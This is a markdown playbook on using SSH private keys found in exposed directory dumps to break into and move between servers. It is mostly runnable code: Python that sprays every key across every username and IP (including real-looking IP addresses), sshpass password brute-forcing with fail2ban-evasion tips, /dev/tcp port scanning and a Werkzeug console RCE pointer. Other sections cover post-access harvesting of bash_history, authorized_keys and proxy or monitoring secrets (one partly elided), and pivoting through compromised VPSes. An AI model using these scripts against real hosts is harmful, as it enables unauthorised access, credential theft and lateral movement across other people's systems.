# SSH Lateral Movement from Exposed Directory Dumps

When an exposed `/tmp` or directory listing contains SSH private keys, the next step is testing those keys against the target host and any other machines referenced in the dump.

## Extracting and Validating Keys

### Key formats found in dumps

| Format | Detection | Fix |
|--------|-----------|-----|
| OpenSSH native (`-----BEGIN OPENSSH PRIVATE KEY-----`) | `ssh-keygen -y -f key` works directly | `chmod 600` |
| PEM PKCS8 (`-----BEGIN PRIVATE KEY-----`) | May have truncated `END` marker or JSON-escaped `\n` | See below |
| Raw base64 single-line (`MIIEvQ...`) | `base64 -d` then wrap in PEM headers | See below |
| DER binary (`.der`) | `od -c` shows non-ASCII | `openssl pkey -inform DER` |

### Fixing malformed PEM keys

**Truncated END marker** — common when the file was written programmatically:
```bash
# Before: -----END PRIVATE KEY--------
# After:  -----END PRIVATE KEY-----
sed -i 's/-----END PRIVATE KEY-----.*/-----END PRIVATE KEY-----/' key.pem
```

**JSON-escaped `\n`** — keys extracted from JSON config may have literal backslash-n:
```python
raw = open('key.pem', 'rb').read()
fixed = raw.replace(b'\\n', b'\n')
open('key_fixed.pem', 'wb').write(fixed)
```

**Raw base64 → PEM**:
```python
import base64
raw = open('client_privkey.txt').read().strip()
decoded = base64.b64decode(raw)
pem = b"-----BEGIN PRIVATE KEY-----\n"
# re-wrap at 64 chars
b64 = base64.b64encode(decoded).decode()
for i in range(0, len(b64), 64):
    pem += b64[i:i+64].encode() + b"\n"
pem += b"-----END PRIVATE KEY-----\n"
open('key.pem', 'wb').write(pem)
```

### Validate key integrity
```bash
chmod 600 key.pem
ssh-keygen -y -f key.pem    # prints public key if valid, or error
```

## Testing Keys Against Targets

### Single-host test
```bash
ssh -i key.pem -o StrictHostKeyChecking=no -o ConnectTimeout=8 \
    -o BatchMode=yes -o LogLevel=ERROR root@TARGET 'id; hostname'
```

Always try multiple usernames: `root ubuntu admin ahqier tc3650 deploy`.

### Parallel multi-host test (Python)

```python
import subprocess, concurrent.futures

KEY = "/path/to/key.pem"
IPS = ["1.2.3.4", "5.6.7.8", ...]  # from scan results in dump

def try_ssh(ip):
    result = subprocess.run(
        ["ssh", "-i", KEY, "-o", "StrictHostKeyChecking=no",
         "-o", "ConnectTimeout=5", "-o", "BatchMode=yes",
         "-o", "LogLevel=ERROR", "-o", "PasswordAuthentication=no",
         f"root@{ip}", "echo OK; id; hostname"],
        capture_output=True, text=True, timeout=12
    )
    if "OK" in result.stdout:
        return ip, True, result.stdout.strip()
    err = (result.stderr or result.stdout).strip().split('\n')[-1]
    return ip, False, err

with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
    futures = {executor.submit(try_ssh, ip): ip for ip in IPS}
    for future in concurrent.futures.as_completed(futures):
        ip, ok, msg = future.result()
        status = "✅" if ok else "❌"
        print(f"{status} {ip}: {msg}")
```

## Discovering VPS Fleets in the Dump

Exposed `/tmp` directories often contain the attacker's own SSH scan scripts and results. Look for:

### Scan result files
- `results*.txt` — Contains `===OK=== <ip>` or `===FAIL=== <ip>` lines per host
- `*.log` in `ssh_test/` directories — Contains `OK`/`DENIED`/`TIMEOUT` per IP
- `check*.sh` / `scan*.sh` — Contains hardcoded IP arrays

### Extracting IPs from scan scripts
```bash
# From bash IP arrays
grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' scan.sh results.txt | sort -u

# From OK lines in results
grep '===OK===' results.txt | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}'
```

### What scan results reveal
- **Hostname and OS** of each VPS (`uname -a`, `/etc/os-release`)
- **Which key worked** — the script references the key path (`KEY=/tmp/ssh_test/test_key`)
- **Key rotation timeline** — `round3.log` with all DENIED means keys were rotated since `results2.txt` showed OK
- **Services running** — scan scripts that check ports (e.g., `check8317.sh` probes for API endpoints)

## Post-Access Reconnaissance

Once root is obtained on any machine, harvest:

```bash
# Identity and network
id; hostname; uname -a; cat /etc/os-release | head -3
ip -4 addr show scope global | grep inet
ss -tlnp  # listening ports

# Credentials and keys
cat /root/.ssh/authorized_keys    # who else has access?
cat /root/.bash_history           # what was done?
ls -la /root/                     # installed tools?

# Running services
systemctl list-units --type=service --state=running

# Proxy/VPN configs (high value)
cat /etc/XrayR/config.yml         # XrayR proxy node config + API key
cat /opt/nezha/agent/config.yml   # Nezha monitoring agent secret

# Suspicious binaries
file /opt/*/SystemLog*            # possible backdoor/rootkit
strings /opt/*/SystemLog | grep -iE 'exec|connect|socket|reverse'

# Cron persistence
crontab -l
```

## Port Scanning Target When SSH Fails

When SSH keys don't work on the original target, scan other ports for alternative entry points:

```bash
for port in 22 80 443 8888 8317 8080 3000; do
  echo -n "Port $port: "
  timeout 3 bash -c "echo >/dev/tcp/TARGET/$port" 2>/dev/null && echo "OPEN" || echo "closed"
done
```

Identify services by fetching:
- Port 8888 + `Server: Werkzeug` → Flask app, try `/console` for debug RCE
- Port 3000 → often a dev/preview page
- Caddy reverse proxy on 80/443 → enumerate vhosts
- Any login panel → try passwords found in the dump against it

## Cartesian Product Key×User×Host Testing

When the target host has unknown authorized_keys and you have multiple keys from the dump, test the full Cartesian product: all keys × all users × all target IPs. A single key that only works for user `ubuntu` (not `root`) is easy to miss with single-user testing.

```python
import subprocess, concurrent.futures

KEYS = {
    "ssh_key_new": "/tmp/try_ssh",          # ed25519 from dump
    "test_key": "/tmp/ssh_test_test_key",    # RSA fleet key from ssh_test/
    "client_key": "/tmp/client_privkey.pem"  # RSA from dump
}
USERS = ["root", "ubuntu", "admin", "www-data", "debian", "deploy",
         "user", "git", "centos", "fedora", "ahqier", "tc3650", "gary"]
IPS = ["64.120.92.187", "158.69.200.89", ...]  # all discovered IPs

def try_ssh(args):
    key_name, key_path, user, ip = args
    result = subprocess.run(
        ["ssh", "-i", key_path, "-o", "StrictHostKeyChecking=no",
         "-o", "ConnectTimeout=5", "-o", "BatchMode=yes",
         "-o", "LogLevel=ERROR", "-o", "PasswordAuthentication=no",
         f"{user}@{ip}", "echo OK; id"],
        capture_output=True, text=True, timeout=10)
    if "OK" in result.stdout:
        return (key_name, user, ip, True, result.stdout.strip())
    return (key_name, user, ip, False, "")

tasks = [(kn, kp, u, ip) for kn, kp in KEYS.items() for u in USERS for ip in IPS]
with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
    futures = {executor.submit(try_ssh, t): t for t in tasks}
    for future in concurrent.futures.as_completed(futures):
        kn, user, ip, ok, msg = future.result()
        if ok:
            print(f"✅ {kn} / {user} / {ip}: {msg}")
```

## SSH Password Brute-Force Pitfall

When SSH allows password auth (`publickey,password` in the banner), trying passwords via `sshpass` can trigger **fail2ban** or similar rate-limiting:

```bash
# This may trigger fail2ban on 10-15 attempts:
for pw in Admin@1234 admin123 password 12345678; do
  sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
    -o NumberOfPasswordPrompts=1 root@TARGET 'echo OK' 2>&1
done
```

After fail2ban triggers, **even valid publickey auth will be blocked** for a cooldown period (typically 10-60 min). If key-based SSH that was working suddenly stops with "Connection refused" or "no route to host", wait 15+ minutes and retry. Always exhaust publickey testing before attempting password auth on the same target.

## Credential Extraction from bash_history

Beyond reading config files, **bash_history often contains inline credentials** passed as environment variables to install scripts:

```bash
# Nezha agent install command — reveals server + secret directly
env NZ_SERVER=m.myshelf.uk:443 NZ_TLS=true NZ_CLIENT_SECRET=IayTZs4E...5vlo ./agent.sh

# These values are also in /opt/nezha/agent/config.yml, but bash_history
# may be the ONLY source if the config was rotated or deleted.
```

Also grep bash_history for:
- `ping <IP>` lines — reveal which other servers the operator manages
- `ssh -i <key> root@<IP>` — reveal SSH key paths and target IPs
- `wget/curl ... install.sh` — reveal software installation history
- `ufw allow <port>` — reveal which proxy ports are open

## Multiple Nezha Agent Configs

A compromised host may run **multiple nezha-agent systemd services**, each pointing to a different monitoring server. Check:

```bash
# List all nezha services
systemctl list-units | grep nezha

# Each service uses a different config file — find ALL of them
systemctl cat nezha-agent*.service | grep ExecStart
# ExecStart=/opt/nezha/agent/nezha-agent -c /opt/nezha/agent/config.yml
# ExecStart=/opt/nezha/agent/nezha-agent -c /opt/nezha/agent/config-m6zrl.yml

# Read every config — each reveals a different monitoring server + secret
cat /opt/nezha/agent/config*.yml
```

The second config may point to a completely different monitoring server (e.g., a direct IP `207.58.173.192:8088` instead of a domain behind Cloudflare). Each `client_secret` is valid for its respective dashboard and can be used for lateral movement.

## known_hosts Parsing

Compromised hosts have `~/.ssh/known_hosts` that reveal which servers the operator regularly connects to:

```bash
cat /root/.ssh/known_hosts
# Hashed entries (|1|hash|hash ed25519 AAAA...) can't reveal IPs directly,
# but the public key fingerprints confirm specific known servers.
# Plaintext entries (rare) reveal IPs directly.
```

## SSH Banner Auth-Method Distinction

The SSH rejection message reveals whether password brute-force is even possible:

| Banner says | Password auth | Action |
|-------------|--------------|--------|
| `Permission denied (publickey).` | **Disabled** | Only publickey works — stop trying passwords |
| `Permission denied (publickey,password).` | Enabled | Can try `sshpass` but watch for fail2ban |

Always read the full rejection to avoid wasting time on password brute-force when only publickey is accepted. The method list in parentheses is the SSH server's `AuthenticationMethods` — if `password` isn't listed, it's compile-time or `sshd_config` disabled.

## Key OpSec Notes

- Keys in `/tmp` with comment `root@localhost` or `root@instance-YYYYMMDD-xx` were generated on that machine — they are its own keys, not necessarily authorized on the target.
- A key found in `ssh_test/test_key` used by scan scripts is a **fleet-wide shared key** — test it against all discovered IPs, not just the target.
- SSH services behind UFW may only allow specific source IPs — a key that works from one VPS may be DENIED from your IP. Pivot through an accessible VPS to test.
-authorized_keys on compromised hosts reveals other actors' keys — useful for attribution.
- When investigating proxy/VPN software on a compromised host, extract API paths from Go binaries: `grep -aoP "/api/v1/[A-Za-z/]+" /usr/local/XrayR/XrayR | sort -u`. Go embeds string literals directly in the binary, making this reliable for discovering undocumented or version-specific endpoints.
